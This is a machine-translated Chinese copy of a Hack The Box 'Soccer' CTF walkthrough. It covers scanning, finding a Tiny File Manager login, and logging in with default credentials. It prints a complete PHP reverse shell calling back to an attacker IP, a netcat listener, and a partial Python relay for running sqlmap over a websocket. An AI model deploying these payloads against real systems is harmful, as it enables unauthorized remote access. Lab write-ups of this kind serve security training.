<html>
<head>
<title>Soccer — Hack The Box | Writeup with Flag | 2023</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">足球—黑盒子|用旗子写文章| 2023</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/soccer-hack-the-box-writeup-with-flag-2023-de695a0e54ec?source=collection_archive---------0-----------------------#2022-12-31">https://infosecwriteups.com/soccer-hack-the-box-writeup-with-flag-2023-de695a0e54ec?source=collection_archive---------0-----------------------#2022-12-31</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="753a" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">《黑盒子——足球机器》Karthikeyan Nagaraj的简单报道</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><a href="https://app.hackthebox.com/machines/Soccer"><div class="gh gi kf"><img src="../Images/93d4782ea2aa7a98dd37ba6a4ddb01ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hNg71gJXwlqVvpTEJ-sDmQ.png"/></div></a></figure><h1 id="6a5c" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">阶段…</h1><ol class=""><li id="2b8f" class="lf lg iq lh b li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">扫描</li><li id="9a0b" class="lf lg iq lh b li lx lk ly lm lz lo ma lq mb ls lt lu lv lw bi translated">列举</li><li id="1c31" class="lf lg iq lh b li lx lk ly lm lz lo ma lq mb ls lt lu lv lw bi translated">权限提升</li></ol><blockquote class="mc md me"><p id="c7ba" class="mf mg mh lh b li mi jr mj lk mk ju ml mm mn mo mp mq mr ms mt mu mv mw mx ls ij bi translated"><strong class="lh ir">确保连接HTB Vpn </strong></p></blockquote><h2 id="0457" class="my ko iq bd kp mz na dn kt nb nc dp kx lm nd ne kz lo nf ng lb lq nh ni ld nj bi translated">1.扫描</h2><p id="1b98" class="pw-post-body-paragraph mf mg iq lh b li lj jr mj lk ll ju ml lm nk mo mp lo nl ms mt lq nm mw mx ls ij bi translated">首先执行nmap扫描<br/> <code class="fe nn no np nq b">nmap -sC -sV &lt;Machine-IP&gt;</code></p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="5685" class="nv ko iq nq b be nw nx l ny nz">┌──(cyberw1ng㉿root)-[~]<br/>└─$ nmap -sC -sV 10.10.11.194<br/>Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 22:45 IST<br/>Nmap scan report for 10.10.11.194 (10.10.11.194)<br/>Host is up (0.22s latency).<br/>Not shown: 997 closed tcp ports (conn-refused)<br/>PORT     STATE SERVICE         VERSION<br/>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)<br/>|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)<br/>|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)<br/>80/tcp   open  http            nginx 1.18.0 (Ubuntu)<br/>|_http-title: Did not follow redirect to http://soccer.htb/<br/>|_http-server-header: nginx/1.18.0 (Ubuntu)<br/>9091/tcp open  xmltec-xmlmail?<br/>| fingerprint-strings: <br/>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: <br/>|     HTTP/1.1 400 Bad Request<br/>|     Connection: close<br/>|   GetRequest: <br/>|     HTTP/1.1 404 Not Found<br/>|     Content-Security-Policy: default-src 'none'<br/>|     X-Content-Type-Options: nosniff<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 139<br/>|     Date: Sat, 31 Dec 2022 17:16:22 GMT<br/>|     Connection: close<br/>|     &lt;!DOCTYPE html&gt;<br/>|     &lt;html lang="en"&gt;<br/>|     &lt;head&gt;<br/>|     &lt;meta charset="utf-8"&gt;<br/>|     &lt;title&gt;Error&lt;/title&gt;<br/>|     &lt;/head&gt;<br/>|     &lt;body&gt;<br/>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;<br/>|     &lt;/body&gt;<br/>|     &lt;/html&gt;<br/>|   HTTPOptions: <br/>|     HTTP/1.1 404 Not Found<br/>|     Content-Security-Policy: default-src 'none'<br/>|     X-Content-Type-Options: nosniff<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 143<br/>|     Date: Sat, 31 Dec 2022 17:16:22 GMT<br/>|     Connection: close<br/>|     &lt;!DOCTYPE html&gt;<br/>|     &lt;html lang="en"&gt;<br/>|     &lt;head&gt;<br/>|     &lt;meta charset="utf-8"&gt;<br/>|     &lt;title&gt;Error&lt;/title&gt;<br/>|     &lt;/head&gt;<br/>|     &lt;body&gt;<br/>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br/>|     &lt;/body&gt;<br/>|     &lt;/html&gt;<br/>|   RTSPRequest: <br/>|     HTTP/1.1 404 Not Found<br/>|     Content-Security-Policy: default-src 'none'<br/>|     X-Content-Type-Options: nosniff<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 143<br/>|     Date: Sat, 31 Dec 2022 17:16:23 GMT<br/>|     Connection: close<br/>|     &lt;!DOCTYPE html&gt;<br/>|     &lt;html lang="en"&gt;<br/>|     &lt;head&gt;<br/>|     &lt;meta charset="utf-8"&gt;<br/>|     &lt;title&gt;Error&lt;/title&gt;<br/>|     &lt;/head&gt;<br/>|     &lt;body&gt;<br/>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br/>|     &lt;/body&gt;<br/>|_    &lt;/html&gt;<br/>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br/>SF-Port9091-TCP:V=7.93%I=7%D=12/31%Time=63B06E60%P=x86_64-pc-linux-gnu%r(i<br/>SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\<br/>SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\<br/>SF:x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r<br/>SF:\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-O<br/>SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC<br/>SF:ontent-Length:\x20139\r\nDate:\x20Sat,\x2031\x20Dec\x202022\x2017:16:22<br/>SF:\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lan<br/>SF:g=\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;<br/>SF:/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(H<br/>SF:TTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po<br/>SF:licy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\<br/>SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143<br/>SF:\r\nDate:\x20Sat,\x2031\x20Dec\x202022\x2017:16:22\x20GMT\r\nConnection<br/>SF::\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;m<br/>SF:eta\x20charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;<br/>SF:Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RTSPRequest,16C,"H<br/>SF:TTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-<br/>SF:src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x2<br/>SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sat,<br/>SF:\x2031\x20Dec\x202022\x2017:16:23\x20GMT\r\nConnection:\x20close\r\n\r\<br/>SF:n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\"<br/>SF:utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS<br/>SF:\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Ba<br/>SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2<br/>SF:F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")<br/>SF:%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec<br/>SF:tion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\<br/>SF:r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\<br/>SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="01c5" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">枚举的最佳方式是检查任何易受攻击的端点<br/>端口和服务运行如下所述，</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="2c46" class="nv ko iq nq b be nw nx l ny nz">Open Ports | Service Running<br/>-----------|-----------------<br/>22         | ssh<br/>80         | http<br/>9091       | xmltec-xmlmail</span></pre><h2 id="c50a" class="my ko iq bd kp mz na dn kt nb nc dp kx lm nd ne kz lo nf ng lb lq nh ni ld nj bi translated"><strong class="ak"> 2。枚举</strong></h2><p id="2d0d" class="pw-post-body-paragraph mf mg iq lh b li lj jr mj lk ll ju ml lm nk mo mp lo nl ms mt lq nm mw mx ls ij bi translated">我们先来看看<code class="fe nn no np nq b">http</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/a66e3ed91b46d8284a6cb032a8abf8ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:816/1*1MJrOLX0txJHgKoqYzheAA.gif"/></div></figure><ol class=""><li id="d85d" class="lf lg iq lh b li mi lk mk lm ob lo oc lq od ls lt lu lv lw bi translated">在打开IP时，它被重定向到<code class="fe nn no np nq b">soccer.htb</code>，因为它看起来像一个私人网站，所以让我们将该域添加到<code class="fe nn no np nq b">/etc/hosts</code></li></ol><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="2832" class="nv ko iq nq b be nw nx l ny nz">sudo echo 10.10.11.194 soccer.htb &gt;&gt; /etc/hosts</span></pre><p id="ba58" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">2.在某些情况下<code class="fe nn no np nq b">sudo</code>不起作用，此时在运行命令前使用<code class="fe nn no np nq b">su</code></p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="ca0e" class="nv ko iq nq b be nw nx l ny nz">su<br/>echo 10.10.11.194 soccer.htb &gt;&gt; /etc/hosts</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/d6592e6cd2e05bbfd00b19d5a69af8c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1176/format:webp/1*rb5zkEyXa-DnFLfBYjb4cQ.png"/></div></figure><p id="ca79" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">现在让我们打开网站<a class="ae of" href="http://soccer.htb/" rel="noopener ugc nofollow" target="_blank"> soccer.htb </a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi og"><img src="../Images/71eb1a6121dc7e8a86c0d724ef9dc7bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uWeG-2W2HNkAm64_Cts7HQ.png"/></div></div></figure><p id="818b" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">3.看起来这个页面没有可用的信息，甚至在源代码中也没有: (</p><p id="6358" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">4.让我们列举目录！！对于简短的web内容枚举，我将使用下面的单词表</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="fc8c" class="nv ko iq nq b be nw nx l ny nz">/usr/share/seclists/Discovery/Web-Content/SVNDigger/all-dirs.txt</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi ol"><img src="../Images/437746512904be3e2cf4013a1a431138.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CjV4AQr9Z9tJilaw_eY7nA.png"/></div></div></figure><p id="25bb" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">有时dirb会变慢，所以你可以使用gobuster作为替代</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi om"><img src="../Images/615b87f1617a6b6d693d193721eb5000.png" data-original-src="https://miro.medium.com/v2/resize:fit:1286/format:webp/1*0OU_FniQubEDrz8C6dsGFw.png"/></div></figure><p id="d6db" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">5.从分析中，我们发现了一个目录<code class="fe nn no np nq b">/tiny</code></p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="5649" class="nv ko iq nq b be nw nx l ny nz">http://soccer.htb/tiny/</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi on"><img src="../Images/19f2b49d9310a90da0680a98998eb659.png" data-original-src="https://miro.medium.com/v2/resize:fit:886/format:webp/1*GgNdPn72grcodB6FyUcqSQ.png"/></div></figure><p id="6412" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">6.注意图像的底部→ <a class="ae of" href="https://tinyfilemanager.github.io/" rel="noopener ugc nofollow" target="_blank"> CCP程序员</a></p><div class="oo op gp gr oq or"><a href="https://github.com/prasathmani/tinyfilemanager" rel="noopener  ugc nofollow" target="_blank"><div class="os ab fo"><div class="ot ab ou cl cj ov"><h2 class="bd ir gy z fp ow fr fs ox fu fw ip bi translated">GitHub-prasathmani/tinyfilemanager:单文件PHP文件管理器，浏览和管理你的文件…</h2><div class="oy l"><h3 class="bd b gy z fp ow fr fs ox fu fw dk translated">TinyFileManager是一个基于web的PHP文件管理器，它是一个简单、快速、体积小的单文件PHP文件，可以…</h3></div><div class="oz l"><p class="bd b dl z fp ow fr fs ox fu fw dk translated">github.com</p></div></div><div class="pa l"><div class="pb l pc pd pe pa pf kl or"/></div></div></a></div><p id="8bc0" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">7.该页面由Tiny File Manager开发，它使用GitHub文档中提到的<strong class="lh ir"> 2个默认凭证</strong>。尝试使用这些凭证登录。</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="7f76" class="nv ko iq nq b be nw nx l ny nz">username: admin<br/>password: admin@123<br/><br/>username: user<br/>password: 12345</span></pre><p id="50c2" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">我们以管理员身份登录: )</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi pg"><img src="../Images/b416781072e32eb14c4570187dc25b3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*obKyjApTg4fxoRJl6Z4MuQ.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/b6b83a12a72a5929118f91397f8f31ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:770/format:webp/1*yILLg1ZS3TM5AkBWunkK-w.png"/></div></figure><p id="8269" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">8.有一个“文件上传”功能，我们可以用它来获得一个<code class="fe nn no np nq b">Reverse shell</code></p><p id="726a" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">9.我用下面的<a class="ae of" href="https://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php" rel="noopener ugc nofollow" target="_blank">反壳</a></p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="3fd4" class="nv ko iq nq b be nw nx l ny nz">&lt;?php<br/><br/>set_time_limit (0);<br/>$VERSION = "1.0";<br/>$ip = '10.10.14.42';  // CHANGE THIS<br/>$port = 2929;       // CHANGE THIS<br/>$chunk_size = 1400;<br/>$write_a = null;<br/>$error_a = null;<br/>$shell = 'uname -a; w; id; /bin/sh -i';<br/>$daemon = 0;<br/>$debug = 0;<br/><br/>if (function_exists('pcntl_fork')) {<br/><br/> $pid = pcntl_fork();<br/> <br/> if ($pid == -1) {<br/>  printit("ERROR: Can't fork");<br/>  exit(1);<br/> }<br/> <br/> if ($pid) {<br/>  exit(0);  <br/> }<br/><br/> if (posix_setsid() == -1) {<br/>  printit("Error: Can't setsid()");<br/>  exit(1);<br/> }<br/><br/> $daemon = 1;<br/>} else {<br/> printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");<br/>}<br/><br/>chdir("/");<br/>umask(0);<br/><br/>$sock = fsockopen($ip, $port, $errno, $errstr, 30);<br/>if (!$sock) {<br/> printit("$errstr ($errno)");<br/> exit(1);<br/>}<br/><br/>$descriptorspec = array(<br/>   0 =&gt; array("pipe", "r"),  <br/>   1 =&gt; array("pipe", "w"),  <br/>   2 =&gt; array("pipe", "w")   <br/>);<br/><br/>$process = proc_open($shell, $descriptorspec, $pipes);<br/><br/>if (!is_resource($process)) {<br/> printit("ERROR: Can't spawn shell");<br/> exit(1);<br/>}<br/><br/>stream_set_blocking($pipes[0], 0);<br/>stream_set_blocking($pipes[1], 0);<br/>stream_set_blocking($pipes[2], 0);<br/>stream_set_blocking($sock, 0);<br/><br/>printit("Successfully opened reverse shell to $ip:$port");<br/><br/>while (1) {<br/><br/> if (feof($sock)) {<br/>  printit("ERROR: Shell connection terminated");<br/>  break;<br/> }<br/><br/> if (feof($pipes[1])) {<br/>  printit("ERROR: Shell process terminated");<br/>  break;<br/> }<br/><br/> $read_a = array($sock, $pipes[1], $pipes[2]);<br/> $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);<br/><br/> if (in_array($sock, $read_a)) {<br/>  if ($debug) printit("SOCK READ");<br/>  $input = fread($sock, $chunk_size);<br/>  if ($debug) printit("SOCK: $input");<br/>  fwrite($pipes[0], $input);<br/> }<br/><br/> if (in_array($pipes[1], $read_a)) {<br/>  if ($debug) printit("STDOUT READ");<br/>  $input = fread($pipes[1], $chunk_size);<br/>  if ($debug) printit("STDOUT: $input");<br/>  fwrite($sock, $input);<br/> }<br/><br/> if (in_array($pipes[2], $read_a)) {<br/>  if ($debug) printit("STDERR READ");<br/>  $input = fread($pipes[2], $chunk_size);<br/>  if ($debug) printit("STDERR: $input");<br/>  fwrite($sock, $input);<br/> }<br/>}<br/><br/>fclose($sock);<br/>fclose($pipes[0]);<br/>fclose($pipes[1]);<br/>fclose($pipes[2]);<br/>proc_close($process);<br/><br/>function printit ($string) {<br/> if (!$daemon) {<br/>  print "$string\n";<br/> }<br/>}<br/><br/>?&gt;</span></pre><p id="6a2a" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">10.确保更改<code class="fe nn no np nq b">IP Address</code>并将其命名为<code class="fe nn no np nq b">.php</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/b6ba3ae25f10edad24e2252b70fd28a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*u1jFNwbEFJGHqCbDNoFO6w.png"/></div></figure><p id="ab08" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">11.然后，上传文件</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/ef4dc75b644cdcba663f75a6480d33a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:864/format:webp/1*ZaVn6RWlfhsvBtLgi9c1PQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi pk"><img src="../Images/53f51b2c141a657af85a9cbcc89ebb96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*49EsSpUuSgAEuKW2WUcqQg.png"/></div></div></figure><p id="4522" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">文件上传到/tiny/uploads/目录中</p><p id="5496" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">12.在运行反向shell之前，使用下面的命令启动监听器(rev_shell中使用的端口应该在这里用来获得反向连接)</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="5b7e" class="nv ko iq nq b be nw nx l ny nz">nc -nvlp 2929</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/954100580ee989a5e33da10d0d8a3198.png" data-original-src="https://miro.medium.com/v2/resize:fit:842/format:webp/1*61PjTgKzQUb6fcdm2nK3og.png"/></div></figure><p id="9149" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">现在键入反向shell的URL，以获得如下所示的反向连接</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="8306" class="nv ko iq nq b be nw nx l ny nz">http://soccer.htb/tiny/uploads/&lt;your-shell-name&gt;</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi pm"><img src="../Images/aaeb5617b0c3ef33e9e05e88d532a90b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*ZaaVqf7V8ucOyD0Ty1docA.gif"/></div></div></figure><p id="1675" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">13.我们得到了反向连接！！</p><p id="85f2" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">现在使用下面的命令来获取bash</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="238d" class="nv ko iq nq b be nw nx l ny nz">python3 -c "import pty;pty.spawn('/bin/bash')" </span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/a32e33200ef46d3bbcea8a8023872365.png" data-original-src="https://miro.medium.com/v2/resize:fit:844/format:webp/1*XPnkOxtd6SiCG70EjLQgsg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi po"><img src="../Images/c032125d0d1299fb0bad5da2377951f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/1*wLoLJ3841cyVR8NQUksiJw.png"/></div><figcaption class="pp pq gj gh gi pr ps bd b be z dk translated">在主目录中找不到任何内容</figcaption></figure><p id="0475" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">14.在<code class="fe nn no np nq b">/etc/nginx/sites-enabled</code>上，我们发现了一个子域</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pt"><img src="../Images/aeb49046513a39701153d110f25a45b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1182/format:webp/1*2yHeMElbHFapiXxls3MKmg.png"/></div></figure><p id="7e48" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">15.因此，让我们将<code class="fe nn no np nq b">soc-player.soccer.htb</code>添加到我们的/etc/hosts中，然后<a class="ae of" href="http://soc-player.soccer.htb/" rel="noopener ugc nofollow" target="_blank">在浏览器</a>中打开它</p><p id="c9af" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated"><a class="ae of" href="http://soc-player.soccer.htb/" rel="noopener ugc nofollow" target="_blank">http://soc-player.soccer.htb/</a></p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="3a1e" class="nv ko iq nq b be nw nx l ny nz">su<br/>echo &lt;htb_machine_ip&gt; soc-player.soccer.htb &gt;&gt; /etc/hosts</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pu"><img src="../Images/2d5e01ee2a287e25fe71ac95a8b80e9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:970/format:webp/1*fViEjYeX3K-ccI75iVP7Qw.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/163d58f238307471612d2321145f51ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1064/format:webp/1*jJkxuEIB0ZQahLXNa9lfww.png"/></div></figure><p id="1561" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">16.有一些选项，如<code class="fe nn no np nq b">Match, Login</code>和<code class="fe nn no np nq b">Signup</code>选项可用</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><a href="http://soc-player.soccer.htb/match"><div class="gh gi pw"><img src="../Images/710b6db5d88ff54e37ded2696c1f13b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*7dlzofFek_qYkltO4puZ2g.png"/></div></a></figure><p id="fdcb" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">让我们注册并登录</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pu"><img src="../Images/a51f537963036c4e48e0fb17b5dc8424.png" data-original-src="https://miro.medium.com/v2/resize:fit:970/format:webp/1*8B7kY0eTD7BRWmNavriWAA.png"/></div><figcaption class="pp pq gj gh gi pr ps bd b be z dk translated">注册和登录后</figcaption></figure><p id="5b57" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">17.在查看源代码时，我们知道这个字段是连接到Web套接字的</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi px"><img src="../Images/eb1f5218271150da04511dd62ec58cbd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*qF-i5lTUEgKYJAnYKAoRWw.png"/></div></figure><p id="8cd2" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">18.我们可以使用下面的python代码将请求从sqlmap定向到我们的本地主机</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="84b3" class="nv ko iq nq b be nw nx l ny nz">from http.server import SimpleHTTPRequestHandler<br/>from socketserver import TCPServer<br/>from urllib.parse import unquote, urlparse<br/>from websocket import create_connection<br/><br/>ws_server = "ws://soc-player.soccer.htb:9091"<br/><br/>def send_ws(payload):<br/> ws = create_connection(ws_server)<br/> # If the server returns a response on connect, use below line <br/> #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here<br/> <br/> # For our case, format the payload in JSON<br/> message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure<br/> data = '{"id":"%s"}' % message<br/><br/> ws.send(data)<br/> resp = ws.recv()<br/> ws.close()<br/><br/> if resp:<br/>  return resp<br/> else:<br/>  return ''<br/><br/>def middleware_server(host_port,content_type="text/plain"):<br/><br/> class CustomHandler(SimpleHTTPRequestHandler):<br/>  def do_GET(self) -&gt; None:<br/>   self.send_response(200)<br/>   try:<br/>    payload = urlparse(self.path).query.split('=',1)[1]<br/>   except IndexError:<br/>    payload = False<br/>    <br/>   if payload:<br/>    content = send_ws(payload)<br/>   else:<br/>    content = 'No parameters specified!'<br/><br/>   self.send_header("Content-type", content_type)<br/>   self.end_headers()<br/>   self.wfile.write(content.encode())<br/>   return<br/><br/> class _TCPServer(TCPServer):<br/>  allow_reuse_address = True<br/><br/> httpd = _TCPServer(host_port, CustomHandler)<br/> 